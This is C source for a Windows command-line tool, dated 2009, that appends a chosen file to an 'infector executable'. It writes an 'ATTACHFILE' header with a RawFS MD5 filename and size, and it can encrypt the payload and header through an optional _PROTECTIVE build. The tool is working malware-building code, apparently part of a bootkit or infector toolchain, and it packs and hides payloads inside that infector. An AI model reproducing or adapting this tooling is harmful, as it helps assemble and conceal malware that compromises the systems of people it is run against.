
// attaches a file to the infector
// Attach File.exe [Infector Executable] [File to attach] [RawFS MD5 Filename]

// Warning! Do not call this multiple times, otherwise the file is appended multiple times!

#include "windows.h"
#include "stdio.h"


/* includes */

#pragma pack(1)
struct FileAttachmentHeader
{
    char Signature[10];     // ATTACHFILE
    char FileName[32];      // MD5 of filename to store via RawFS
    DWORD FileSize;         // size of the file
    DWORD Key;              // decryption key
};


/* special functions */

#ifdef _PROTECTIVE
#include "../Source/Protective.cpp"
#endif


/* Application Entry */

int main(int argc, char *argv[], char *envp[])
{
	// check parameters passed to application
	if (argc < 4)
	{
		puts("\nInvalid Arguments. Please specify the infector executable and the file to attach. Usage:\n");
        puts("\n  Attach File.exe [Infector Executable] [File to attach] [RawFS MD5 Filename]\n");
    	puts("  Version 0.1  " __DATE__);
#ifdef _PROTECTIVE
        puts(" PROTECTIVE RELEASE - USE ONLY WITH PROTECTIVE INFECTOR");
#endif
    	puts("  (C) 2009 Insecurity Systems InSec e.U.\n\n");
		return FALSE;
	}

    // create a handle to the files
    HANDLE FileInfector = CreateFileA(argv[1], GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_RANDOM_ACCESS, NULL);
    HANDLE FileAttach = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_RANDOM_ACCESS, NULL);
    if (FileInfector == INVALID_HANDLE_VALUE || FileAttach == INVALID_HANDLE_VALUE)
    {
        puts("Could not open input file");
        return 0;
    }

    DWORD FileSizeInfector = GetFileSize(FileInfector, NULL);
    DWORD FileSizeAttach = GetFileSize(FileAttach, NULL);
    if (FileSizeInfector == INVALID_FILE_SIZE || FileSizeAttach == INVALID_FILE_SIZE)
    {
        puts("Could not get file size");
        return 0;
    }

    BYTE * Buffer = (BYTE *)VirtualAlloc(NULL, FileSizeAttach, MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);
    if (!Buffer)
    {
        puts("Could not allocate memory");
        return 0;
    }

    DWORD BytesRead;
    if (!ReadFile(FileAttach, Buffer, FileSizeAttach, &BytesRead, NULL))
    {
        puts("Could not read to-attach file");
        return 0;
    }
    CloseHandle(FileAttach);
    if (SetFilePointer(FileInfector, FileSizeInfector, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
    {
        puts("Could not seek file");
        return 0;
    }

    // write the descriptor! =)
    FileAttachmentHeader Header;
    memcpy(Header.Signature, "ATTACHFILE", 10);
    memcpy(Header.FileName, argv[3], 32);
    Header.FileSize = FileSizeAttach;
    Header.Key = 0;

#ifdef _PROTECTIVE
    Crypt_Stage1(Buffer, FileSizeAttach, &Header);
    Crypt_Stage0(Buffer, FileSizeAttach);
    Crypt_Stage0((BYTE *)&Header, sizeof(Header));
#endif

    if (!WriteFile(FileInfector, &Header, sizeof(Header), &BytesRead, NULL))
    {
        puts("Could not write the header");
        return 0;
    }

    // attach the raw file
    if (!WriteFile(FileInfector, Buffer, FileSizeAttach, &BytesRead, NULL))
    {
        puts("Could not read to-attach file");
        return 0;
    }

    printf("Attached successfully %s\n", argv[2]);
    return 1;
}
